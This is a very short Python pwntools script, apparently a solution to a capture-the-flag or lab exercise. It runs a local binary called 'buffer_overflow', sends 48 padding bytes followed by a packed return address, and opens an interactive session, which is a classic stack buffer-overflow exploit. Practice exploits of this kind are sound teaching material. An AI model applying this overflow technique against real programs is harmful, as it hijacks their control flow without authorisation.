#!/usr/bin/env python
# -*- cding: utf8 -*-
from pwn import * # pip install pwntools

r = process('./buffer_overflow')
r.send('A'*48 + p32(0x004005b6))
r.interactive()

